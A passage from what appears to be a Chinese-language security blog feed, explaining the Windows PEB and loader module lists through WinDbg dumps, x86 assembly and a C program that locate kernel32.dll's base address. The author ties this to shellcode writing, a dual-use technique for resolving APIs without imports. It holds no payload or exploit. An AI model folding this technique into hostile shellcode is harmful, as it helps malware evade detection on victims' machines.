;IMAGE_EXPORT_DIRECTORY        add edx,ebx ;EDX = Export table        mov esi, [edx + 0x20]    ; ESI = Offset namestable        add esi, ebx             ; ESI = Names table        xor ecx, ecx             ; EXC = 0</code></pre><p>yasm和golink编译成exe</p><pre><code>yasm.win32.exe -f win32 -o test.obj test.asmGolink /ni /entry _start shell.obj</code></pre><p>然后拖入windbg调，自动解析PEB<code>!peb</code><br><img src="https://s3.ax1x.com/2021/02/22/y7XI41.png" alt=""></p><ul><li>InheritedAddressSpace: 继承的地址空间</li><li>ReadImageFileExecOptions: 读取文件镜像执行选项</li><li>BeingDebugged: 是否在被调试</li><li>ImageBaseAddress: 镜像基本的地址</li><li>Ldr: (到PEB_LDR_DATA结构的指针，提供被加载模块的信息。)包含kernel32 与ntdll的基地址</li><li>SubSystemData: 子系统数据</li><li>ProcessHeap: 进程堆栈首地址</li><li>ProcessParameters: 进程参数地址</li><li>CurrentDirectory: 当前目录</li><li>WindowTitle: 窗口标题</li><li>ImageFile: 镜像我呢见</li><li>CommandLine: 命令行</li><li>DllPath: DLL路径</li><li>Environment: 环境</li></ul><p>手动解析PEB<code>dt _PEB @$peb</code></p><pre><code class="asm">ntdll!_PEB   +0x000 InheritedAddressSpace : 0 &#39;&#39;   +0x001 ReadImageFileExecOptions : 0 &#39;&#39;   +0x002 BeingDebugged    : 0x1 &#39;&#39;   +0x003 BitField         : 0 &#39;&#39;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y0   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Mutant           : 0xffffffff Void   +0x008 ImageBaseAddress : 0x00400000 Void   +0x00c Ldr              : 0x7750dca0 _PEB_LDR_DATA   +0x010 ProcessParameters : 0x004b1d38 _RTL_USER_PROCESS_PARAMETERS   +0x014 SubSystemData    : (null)    +0x018 ProcessHeap      : 0x004b0000 Void   +0x01c FastPebLock      : 0x7750da60 _RTL_CRITICAL_SECTION   +0x020 AtlThunkSListPtr : (null)    +0x024 IFEOKey          : (null)    +0x028 CrossProcessFlags : 3   +0x028 ProcessInJob     : 0y1   +0x028 ProcessInitializing : 0y1   +0x028 ProcessUsingVEH  : 0y0   +0x028 ProcessUsingVCH  : 0y0   +0x028 ProcessUsingFTH  : 0y0   +0x028 ProcessPreviouslyThrottled : 0y0   +0x028 ProcessCurrentlyThrottled : 0y0   +0x028 ProcessImagesHotPatched : 0y0   +0x028 ReservedBits0    : 0y000000000000000000000000 (0)   +0x02c KernelCallbackTable : (null)    +0x02c UserSharedInfoPtr : (null)    +0x030 SystemReserved   : 0   +0x034 AtlThunkSListPtr32 : (null)    +0x038 ApiSetMap        : 0x00040000 Void   +0x03c TlsExpansionCounter : 0   +0x040 TlsBitmap        : 0x7750dc50 Void   +0x044 TlsBitmapBits    : [2] 0x10001   +0x04c ReadOnlySharedMemoryBase : 0x7fe40000 Void   +0x050 SharedData       : (null)    +0x054 ReadOnlyStaticServerData : 0x7fe40750  -&gt; (null)    +0x058 AnsiCodePageData : 0x7ffa0000 Void   +0x05c OemCodePageData  : 0x7ffa0000 Void   +0x060 UnicodeCaseTableData : 0x7ffd0028 Void   +0x064 NumberOfProcessors : 0xc   +0x068 NtGlobalFlag     : 0x70   +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000   +0x078 HeapSegmentReserve : 0x100000   +0x07c HeapSegmentCommit : 0x2000   +0x080 HeapDeCommitTotalFreeThreshold : 0x10000   +0x084 HeapDeCommitFreeBlockThreshold : 0x1000   +0x088 NumberOfHeaps    : 1   +0x08c MaximumNumberOfHeaps : 0x10   +0x090 ProcessHeaps     : 0x7750c760  -&gt; 0x004b0000 Void   +0x094 GdiSharedHandleTable : (null)    +0x098 ProcessStarterHelper : (null)    +0x09c GdiDCAttributeList : 0   +0x0a0 LoaderLock       : 0x7750b3d0 _RTL_CRITICAL_SECTION   +0x0a4 OSMajorVersion   : 0xa   +0x0a8 OSMinorVersion   : 0   +0x0ac OSBuildNumber    : 0x47bb   +0x0ae OSCSDVersion     : 0   +0x0b0 OSPlatformId     : 2   +0x0b4 ImageSubsystem   : 2   +0x0b8 ImageSubsystemMajorVersion : 4   +0x0bc ImageSubsystemMinorVersion : 0   +0x0c0 ActiveProcessAffinityMask : 0xfff   +0x0c4 GdiHandleBuffer  : [34] 0   +0x14c PostProcessInitRoutine : (null)    +0x150 TlsExpansionBitmap : 0x7750dc38 Void   +0x154 TlsExpansionBitmapBits : [32] 1   +0x1d4 SessionId        : 1   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0   +0x1e8 pShimData        : 0x001b0000 Void   +0x1ec AppCompatInfo    : (null)    +0x1f0 CSDVersion       : _UNICODE_STRING &quot;&quot;   +0x1f8 ActivationContextData : (null)    +0x1fc ProcessAssemblyStorageMap : (null)    +0x200 SystemDefaultActivationContextData : 0x001a0000 _ACTIVATION_CONTEXT_DATA   +0x204 SystemAssemblyStorageMap : (null)    +0x208 MinimumStackCommit : 0   +0x20c SparePointers    : [4] (null)    +0x21c SpareUlongs      : [5] 0   +0x230 WerRegistrationData : (null)    +0x234 WerShipAssertPtr : (null)    +0x238 pUnused          : (null)    +0x23c pImageHeaderHash : (null)    +0x240 TracingFlags     : 0   +0x240 HeapTracingEnabled : 0y0   +0x240 CritSecTracingEnabled : 0y0   +0x240 LibLoaderTracingEnabled : 0y0   +0x240 SpareTracingBits : 0y00000000000000000000000000000 (0)   +0x248 CsrServerReadOnlySharedMemoryBase : 0x00007df4`2f970000   +0x250 TppWorkerpListLock : 0   +0x254 TppWorkerpList   : _LIST_ENTRY [ 0x276254 - 0x276254 ]   +0x25c WaitOnAddressHashTable : [128] (null)    +0x45c TelemetryCoverageHeader : (null)    +0x460 CloudFileFlags   : 0x60   +0x464 CloudFileDiagFlags : 0   +0x468 PlaceholderCompatibilityMode : 1 &#39;&#39;   +0x469 PlaceholderCompatibilityModeReserved : [7]  &quot;&quot;   +0x470 LeapSecondData   : 0x7ff90000 _LEAP_SECOND_DATA   +0x474 LeapSecondFlags  : 0   +0x474 SixtySecondEnabled : 0y0   +0x474 Reserved         : 0y0000000000000000000000000000000 (0)   +0x478 NtGlobalFlag2    : 0</code></pre><p>这里比较重要的是Ldr,(PEB_LDR_DATA结构的指针，提供被加载模块的信息。)</p><p>Ldr分析<br><img src="https://s3.ax1x.com/2021/02/22/yHnGZj.png" alt=""></p><pre><code class="asm">   +0x000 Length           : 0x30   +0x004 Initialized      : 0x1 &#39;&#39;   +0x008 SsHandle         : (null)    +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4b3720 - 0x4b3d30 ]  //按加载顺序   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4b3728 - 0x4b3d38 ] //按内存顺序   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4b3628 - 0x4b3d40 ] //按初始化顺序   +0x024 EntryInProgress  : (null)    +0x028 ShutdownInProgress : 0 &#39;&#39;   +0x02c ShutdownThreadId : (null) </code></pre><p>InLoadOrderModuleList、InMemoryOrderModuleList、InMemoryOrderModuleList这三个是双向链表<br>(其实三个都一样，顺序不同而已)<br>对应的格式为 LIST_ENTRY</p><pre><code class="asm">0:000&gt; dt _LIST_ENTRYntdll!_LIST_ENTRY   +0x000 Flink            : Ptr32 _LIST_ENTRY   +0x004 Blink            : Ptr32 _LIST_ENTRY</code></pre><p><strong>LDR_DATA_TABLE_ENTRY structure,双向循环链表</strong>吧，从一个方向开始，不停的循环，就回到初始位了，就相当于遍历了一次</p><p>结构如下</p><pre><code class="asm">0:000&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY   +0x008 InMemoryOrderLinks : _LIST_ENTRY   +0x010 InInitializationOrderLinks : _LIST_ENTRY   +0x018 DllBase          : Ptr32 Void   +0x01c EntryPoint       : Ptr32 Void   +0x020 SizeOfImage      : Uint4B   +0x024 FullDllName      : _UNICODE_STRING   +0x02c BaseDllName      : _UNICODE_STRING   +0x034 FlagGroup        : [4] UChar   +0x034 Flags            : Uint4B   +0x034 PackagedBinary   : Pos 0, 1 Bit   +0x034 MarkedForRemoval : Pos 1, 1 Bit   +0x034 ImageDll         : Pos 2, 1 Bit   +0x034 LoadNotificationsSent : Pos 3, 1 Bit   +0x034 TelemetryEntryProcessed : Pos 4, 1 Bit   +0x034 ProcessStaticImport : Pos 5, 1 Bit   +0x034 InLegacyLists    : Pos 6, 1 Bit   +0x034 InIndexes        : Pos 7, 1 Bit   +0x034 ShimDll          : Pos 8, 1 Bit   +0x034 InExceptionTable : Pos 9, 1 Bit   +0x034 ReservedFlags1   : Pos 10, 2 Bits   +0x034 LoadInProgress   : Pos 12, 1 Bit   +0x034 LoadConfigProcessed : Pos 13, 1 Bit   +0x034 EntryProcessed   : Pos 14, 1 Bit   +0x034 ProtectDelayLoad : Pos 15, 1 Bit   +0x034 ReservedFlags3   : Pos 16, 2 Bits   +0x034 DontCallForThreads : Pos 18, 1 Bit   +0x034 ProcessAttachCalled : Pos 19, 1 Bit   +0x034 ProcessAttachFailed : Pos 20, 1 Bit   +0x034 CorDeferredValidate : Pos 21, 1 Bit   +0x034 CorImage         : Pos 22, 1 Bit   +0x034 DontRelocate     : Pos 23, 1 Bit   +0x034 CorILOnly        : Pos 24, 1 Bit   +0x034 ChpeImage        : Pos 25, 1 Bit   +0x034 ReservedFlags5   : Pos 26, 2 Bits   +0x034 Redirected       : Pos 28, 1 Bit   +0x034 ReservedFlags6   : Pos 29, 2 Bits   +0x034 CompatDatabaseProcessed : Pos 31, 1 Bit   +0x038 ObsoleteLoadCount : Uint2B   +0x03a TlsIndex         : Uint2B   +0x03c HashLinks        : _LIST_ENTRY   +0x044 TimeDateStamp    : Uint4B   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT   +0x04c Lock             : Ptr32 Void   +0x050 DdagNode         : Ptr32 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY   +0x05c LoadContext      : Ptr32 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : Ptr32 Void   +0x064 SwitchBackContext : Ptr32 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : Uint4B   +0x088 LoadTime         : _LARGE_INTEGER   +0x090 BaseNameHashValue : Uint4B   +0x094 LoadReason       : _LDR_DLL_LOAD_REASON   +0x098 ImplicitPathOptions : Uint4B   +0x09c ReferenceCount   : Uint4B   +0x0a0 DependentLoadFlags : Uint4B   +0x0a4 SigningLevel     : UChar</code></pre><p>跟上面的汇编一样找InMemoryOrderModuleList来遍历<code>0x4b3728 - 0x4b3d38</code>这个地址范围里存着对应的内存顺序载入过程</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>然后通过不断遍历链表元素里的InLoadOrderLinks，最后找到kernel32.dll</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3620 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3b08 - 0x4b3728 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3ed0 - 0x7750dcbc ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x773f0000 - 0x0 ]   +0x018 DllBase          : 0x0019a000 Void   +0x01c EntryPoint       : 0x003c003a Void   +0x020 SizeOfImage      : 0x4b34f8   +0x024 FullDllName      : _UNICODE_STRING &quot;ntdll.dll&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;@???&quot;   +0x034 Flags            : 0x7750db40   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y0   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb40   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x1e699fab - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b36d8 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b36d8 Void   +0x050 DdagNode         : 0x004b36d8 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : (null)    +0x060 ParentDllBase    : 0x004b3f28 Void   +0x064 SwitchBackContext : (null)    +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0xf46857d4   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0x800   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3b08 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3ec8 - 0x4b3620 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3d40 - 0x4b3ed0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]   +0x018 DllBase          : 0x000e0000 Void   +0x01c EntryPoint       : 0x00420040 Void   +0x020 SizeOfImage      : 0x4b3c08   +0x024 FullDllName      : _UNICODE_STRING &quot;KERNEL32.DLL&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;0???&quot;   +0x034 Flags            : 0x7750db30   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y1   +0x034 InLegacyLists    : 0y0   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb30   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x59b71f87 - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b3bc0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b3bc0 Void   +0x050 DdagNode         : 0x004b3bc0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : 0x773f1194 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : 0x004b3788 Void   +0x064 SwitchBackContext : 0x004b3680 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`536cd652   +0x090 BaseNameHashValue : 0x4000   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>对面上面的汇编</p><pre><code class="asm">mov eax,[fs:0x30] ;EAX=PEBmov eax,[eax+0xc] ;EAX=PEB-&gt;Ldrmov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)mov ebx,[eax+0x10] ;EBX=Kernel32基地址</code></pre><p>最后对应的0x10链表首地址放的即为kernel32.dll的基址</p><pre><code> +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]</code></pre><p>其实可以简写成别的(lodsd看起来容易把人搞混）</p><pre><code class="asm">mov eax, fs:[0x30]   //得到PEB地址，其实这里还有个TEB的概念，但是只用到这一次，为了防止混乱，就不再解释了mov eax, [eax + 0xc]//指向PEB_LDR_DATA结构的首地址mov eax, [eax + 0x1c]//一个双向链表的地址mov eax, [eax]//得到第二个条目kernelBase的链表mov eax, [eax]//得到第三个条目kernel32链表（win10）mov eax, [eax + 0x8] //kernel32.dll地址</code></pre><p>对应0x8链表里的kernel32.dll基址<br><img src="https://s3.ax1x.com/2021/02/22/yHtCWQ.png" alt=""></p><p><strong>在内存里的过程</strong><br>可以使用OD进行验证，od拖入test.exe。然后在堆栈窗口ctrl+G输入<code>fs:[0]</code>跳到所在位置<br>执行<code>mov eax,fs[0x30]</code>后<br><img src="https://s3.ax1x.com/2021/02/22/yHN04U.png" alt=""></p><p>执行<code>mov eax, [eax + 0xc]</code>得到LDR地址<br>(得到PEB地址后，在内存窗口ctrl+G输入PEB的地址，选择”长型”-&gt;”地址”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD3dA.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHwYGT.png" alt=""></p><p>执行<code>lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址</code>得到链表里的第一个Flink的地址<br>(数据窗口选择刚刚的InMemoryOrderModuleList地址，选择”数据窗口跟随”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD5w9.png" alt=""></p><p>继续执行</p><pre><code>xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHr9Yt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHrZwj.png" alt=""></p><p>如何用C实现？<br>1.直接用汇编返回对PEB地址然后根据微软给的数据结构解析即可<br>2.直接用给出的数据结构来解析 （好像可以这么写）</p><p>第一种方法</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main(){    DWORD PPEB;    DWORD LLDR;    DWORD dllbase;    DWORD initlist;    DWORD virtualaddress;    PCHAR dllname;    char *kernel32dllname = &quot;KERNEL32.dll&quot;;    PIMAGE_DOS_HEADER dosheader;    PIMAGE_NT_HEADERS ntheader;    PIMAGE_EXPORT_DIRECTORY exportdirectory;    __asm {        mov eax, fs:[0x30];EAX = PEB        mov PPEB,eax    }    LLDR = *(PDWORD)(PPEB + 0xc); //LDR    printf(&quot;PEB Address:0x%x\n&quot;, PPEB);    initlist=*(PDWORD)(LLDR+0x1c); //LDR-&gt;InInitializationOrderModuleList    CHAR szGetProcAddr[]=&quot;GetProcAddress&quot;;    CHAR szLoadLib[]=&quot;LoadLibraryA&quot;;    for (;dllbase = *(PDWORD)(initlist + 0x8);initlist = *(PDWORD)initlist) { //遍历InMemoryOrderLinks链表        dosheader = (PIMAGE_DOS_HEADER)dllbase; //DOS头部        ntheader = (PIMAGE_NT_HEADERS)(dllbase+dosheader-&gt;e_lfanew); //PE头部        virtualaddress = ntheader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress; //EXPORT_DIRECTORY        exportdirectory = (PIMAGE_EXPORT_DIRECTORY)(dllbase + virtualaddress); //导出表        dllname = (PCHAR)(dllbase + exportdirectory-&gt;Name); //DLL Name        if (!strcmp(dllname, kernel32dllname)) {            printf(&quot;%s Address:0x%x\n&quot;, kernel32dllname, dllbase);        }    }    system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHrsne.png" alt=""></p><p>之后就是从kernel32.dll的PE里导出loadlibraryA和GetProcAddress函数的地址。<br>（下次在写）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jb51.net/article/171962.htm" target="_blank" rel="noopener">https://www.jb51.net/article/171962.htm</a><br><a href="https://zhuanlan.zhihu.com/p/109079902" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/109079902</a><br><a href="https://www.cnblogs.com/lsgxeva/p/10794735.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsgxeva/p/10794735.html</a><br><a href="https://xz.aliyun.com/t/2108" target="_blank" rel="noopener">https://xz.aliyun.com/t/2108</a><br><a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。&lt;/p&gt;
&lt;h2 id=&quot;P</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Hack the box Academy</title>
    <link href="http://422926799.github.io/posts/ae09ddc5.html"/>
